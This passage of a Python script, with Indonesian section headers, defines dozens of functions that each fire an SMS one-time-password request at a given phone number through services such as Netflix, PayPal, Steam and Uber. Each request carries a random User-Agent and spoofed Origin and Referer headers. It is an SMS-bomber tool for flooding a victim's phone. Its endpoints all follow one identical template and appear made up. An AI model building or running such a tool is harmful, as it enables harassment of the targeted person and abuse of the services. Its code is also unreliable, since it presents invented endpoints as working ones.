    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.snapchat.com", "Referer": "https://www.snapchat.com/login"}
    return _send_otp(url, {"phone": phone_plus, "type": "sms"}, headers)

# ============================================================
# BAGIAN 13: INTERNASIONAL STREAMING (8)
# ============================================================

def send_netflix_otp(phone_plus):
    url = "https://api.netflix.com/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.netflix.com", "Referer": "https://www.netflix.com/login"}
    return _send_otp(url, {"phone": phone_plus, "method": "sms"}, headers)

def send_spotify_otp(phone_plus):
    url = "https://api.spotify.com/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.spotify.com", "Referer": "https://www.spotify.com/login"}
    return _send_otp(url, {"phone": phone_plus, "type": "sms"}, headers)

def send_youtube_otp(phone_plus):
    url = "https://api.youtube.com/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.youtube.com", "Referer": "https://www.youtube.com/login"}
    return _send_otp(url, {"phone": phone_plus, "method": "sms"}, headers)

def send_disney_otp(phone_plus):
    url = "https://api.disneyplus.com/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.disneyplus.com", "Referer": "https://www.disneyplus.com/login"}
    return _send_otp(url, {"phone": phone_plus, "type": "sms"}, headers)

def send_hbomax_otp(phone_plus):
    url = "https://api.hbomax.com/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.hbomax.com", "Referer": "https://www.hbomax.com/login"}
    return _send_otp(url, {"phone": phone_plus, "method": "sms"}, headers)

def send_primevideo_otp(phone_plus):
    url = "https://api.primevideo.com/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.primevideo.com", "Referer": "https://www.primevideo.com/login"}
    return _send_otp(url, {"phone": phone_plus, "type": "sms"}, headers)

def send_apple_otp(phone_plus):
    url = "https://api.apple.com/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.apple.com", "Referer": "https://www.apple.com/login"}
    return _send_otp(url, {"phone": phone_plus, "method": "sms"}, headers)

def send_tiktokmusic_otp(phone_plus):
    url = "https://api.tiktokmusic.com/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.tiktokmusic.com", "Referer": "https://www.tiktokmusic.com/login"}
    return _send_otp(url, {"phone": phone_plus, "type": "sms"}, headers)

# ============================================================
# BAGIAN 14: INTERNASIONAL GAMING (8)
# ============================================================

def send_steam_otp(phone_plus):
    url = "https://api.steam.com/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.steam.com", "Referer": "https://www.steam.com/login"}
    return _send_otp(url, {"phone": phone_plus, "method": "sms"}, headers)

def send_epic_otp(phone_plus):
    url = "https://api.epicgames.com/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.epicgames.com", "Referer": "https://www.epicgames.com/login"}
    return _send_otp(url, {"phone": phone_plus, "type": "sms"}, headers)

def send_playstation_otp(phone_plus):
    url = "https://api.playstation.com/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.playstation.com", "Referer": "https://www.playstation.com/login"}
    return _send_otp(url, {"phone": phone_plus, "method": "sms"}, headers)

def send_xbox_otp(phone_plus):
    url = "https://api.xbox.com/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.xbox.com", "Referer": "https://www.xbox.com/login"}
    return _send_otp(url, {"phone": phone_plus, "type": "sms"}, headers)

def send_nintendo_otp(phone_plus):
    url = "https://api.nintendo.com/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.nintendo.com", "Referer": "https://www.nintendo.com/login"}
    return _send_otp(url, {"phone": phone_plus, "method": "sms"}, headers)

def send_roblox_otp(phone_plus):
    url = "https://api.roblox.com/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.roblox.com", "Referer": "https://www.roblox.com/login"}
    return _send_otp(url, {"phone": phone_plus, "type": "sms"}, headers)

def send_minecraft_otp(phone_plus):
    url = "https://api.minecraft.net/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.minecraft.net", "Referer": "https://www.minecraft.net/login"}
    return _send_otp(url, {"phone": phone_plus, "method": "sms"}, headers)

def send_valorant_otp(phone_plus):
    url = "https://api.valorant.com/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.valorant.com", "Referer": "https://www.valorant.com/login"}
    return _send_otp(url, {"phone": phone_plus, "type": "sms"}, headers)

# ============================================================
# BAGIAN 15: INTERNASIONAL PAYMENT (8)
# ============================================================

def send_paypal_otp(phone_plus):
    url = "https://api.paypal.com/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.paypal.com", "Referer": "https://www.paypal.com/login"}
    return _send_otp(url, {"phone": phone_plus, "method": "sms"}, headers)

def send_stripe_otp(phone_plus):
    url = "https://api.stripe.com/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.stripe.com", "Referer": "https://www.stripe.com/login"}
    return _send_otp(url, {"phone": phone_plus, "type": "sms"}, headers)

def send_square_otp(phone_plus):
    url = "https://api.square.com/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.square.com", "Referer": "https://www.square.com/login"}
    return _send_otp(url, {"phone": phone_plus, "method": "sms"}, headers)

def send_klarna_otp(phone_plus):
    url = "https://api.klarna.com/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.klarna.com", "Referer": "https://www.klarna.com/login"}
    return _send_otp(url, {"phone": phone_plus, "type": "sms"}, headers)

def send_revolut_otp(phone_plus):
    url = "https://api.revolut.com/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.revolut.com", "Referer": "https://www.revolut.com/login"}
    return _send_otp(url, {"phone": phone_plus, "method": "sms"}, headers)

def send_wise_otp(phone_plus):
    url = "https://api.wise.com/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.wise.com", "Referer": "https://www.wise.com/login"}
    return _send_otp(url, {"phone": phone_plus, "type": "sms"}, headers)

def send_n26_otp(phone_plus):
    url = "https://api.n26.com/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.n26.com", "Referer": "https://www.n26.com/login"}
    return _send_otp(url, {"phone": phone_plus, "method": "sms"}, headers)

def send_monzo_otp(phone_plus):
    url = "https://api.monzo.com/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.monzo.com", "Referer": "https://www.monzo.com/login"}
    return _send_otp(url, {"phone": phone_plus, "type": "sms"}, headers)

# ============================================================
# BAGIAN 16: INTERNASIONAL DELIVERY (6)
# ============================================================

def send_uber_otp(phone_plus):
    url = "https://api.uber.com/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.uber.com", "Referer": "https://www.uber.com/login"}
    return _send_otp(url, {"phone": phone_plus, "method": "sms"}, headers)

def send_lyft_otp(phone_plus):
    url = "https://api.lyft.com/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.lyft.com", "Referer": "https://www.lyft.com/login"}
    return _send_otp(url, {"phone": phone_plus, "type": "sms"}, headers)

def send_doordash_otp(phone_plus):
    url = "https://api.doordash.com/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.doordash.com", "Referer": "https://www.doordash.com/login"}
    return _send_otp(url, {"phone": phone_plus, "method": "sms"}, headers)

def send_ubereats_otp(phone_plus):
    url = "https://api.ubereats.com/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.ubereats.com", "Referer": "https://www.ubereats.com/login"}
    return _send_otp(url, {"phone": phone_plus, "type": "sms"}, headers)

def send_bolt_otp(phone_plus):
    url = "https://api.bolt.com/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.bolt.com", "Referer": "https://www.bolt.com/login"}
    return _send_otp(url, {"phone": phone_plus, "method": "sms"}, headers)

def send_didi_otp(phone_plus):
    url = "https://api.didi.com/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.didi.com", "Referer": "https://www.didi.com/login"}
    return _send_otp(url, {"phone": phone_plus, "type": "sms"}, headers)